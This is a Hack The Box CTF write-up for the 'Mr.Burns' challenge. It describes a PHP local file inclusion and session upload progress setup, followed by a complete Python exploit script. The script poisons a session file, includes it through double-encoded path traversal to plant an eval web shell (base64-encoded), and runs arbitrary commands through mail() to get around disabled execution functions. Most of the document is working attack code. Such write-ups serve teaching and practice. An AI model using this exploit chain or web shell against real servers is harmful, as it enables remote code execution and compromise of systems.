## Mr.Burns - Hackthebox
<hr />  
   
     
### Stricts  
- open_basedir("/tmp:/www")  
- disable_functions = exec, system, popen, proc_open, shell_exec, passthru, ini_set, putenv, pfsockopen, fsockopen, socket_create  

### Overview  
- Local File Inclusion  
```php  
class MinerController 
{
    public function show($router, $params) 
    {   
        $miner_id = $params[0];
        include("./miners/${miner_id}");
...
```  
- Session upload progress  
```
session.upload_progress.enabled	      On	      On
```  
- Session save path set `no-value` ==> Default path is `/tmp`  
```
session.save_path	      no value	        no value  
```  
- Web path: `/www`  


### Exploit  
#### Step by step to exploit
- Upload `PHP_SESSION_UPLOAD_PROGRESS` and `malicous php code`
- Try to include session file stored at `/tmp` and write web-shell  
- Create a bash file store command get flag  
- Use `mail()` function to execute base file was created  

#### My code exploit  
  
```python3  
import requests
import base64
from urllib.parse import quote

r = requests.Session()
url = 'http://46.101.23.188:31323'


def write_shell(session_name, web_path):
	payload = f"<?php file_put_contents('{web_path + '/shell.php'}',base64_decode('PD9waHAgZXZhbCgkX0dFVFsiY21kIl0pOyA/Pg==')); ?>"
	# PD9waHAgZXZhbCgkX0dFVFsiY21kIl0pOyA/Pg== : eval param $_GET["cmd"]
	cookies = {'PHPSESSID': session_name}
	data= {'PHP_SESSION_UPLOAD_PROGRESS': 'xxxxxxxxxxxxxxxxxxxx'}
	files = {
		f'{payload}': 'a' * 100
	}
	
	print("[+] Post PHP_SESSION_UPLOAD_PROGRESS ")
	r.post(url + '/info', cookies=cookies, files=files, data=data)

	print(f"[+] Include session file stored at /tmp/sess_{session_name}")
	r.get(url + '/miner/' + quote(quote(f'../../../tmp/sess_{session_name}', safe='')))

	print(f"[+] Web shell: {url + '/shell.php?cmd='}")


if __name__ == "__main__":
	SESSION_NAME = 'nhienit'
	WEB_PATH = '/www'
	print("[+] Try to write web shell ")
	write_shell(SESSION_NAME, WEB_PATH)

	print("[+] Write bash file to read flag")
	bash_command = "/readflag > /www/flag.txt"
	payload = f"$file=fopen('/www/getflag', 'w'); fwrite($file, '{bash_command}'); chmod('getflag', 0777);";
	requests.get(url + '/shell.php?cmd=' + quote(payload, safe=''))

	print("[+] Use mail() to trigger getflag binary file")
	payload = "mail('', '', '', '', '-H \"exec /www/getflag\"');"
	requests.get(url + '/shell.php?cmd=' + quote(payload))

	print("[+] Try to get flag")
	flag = r.get(url + '/flag.txt')

	print(flag.text)
```
  















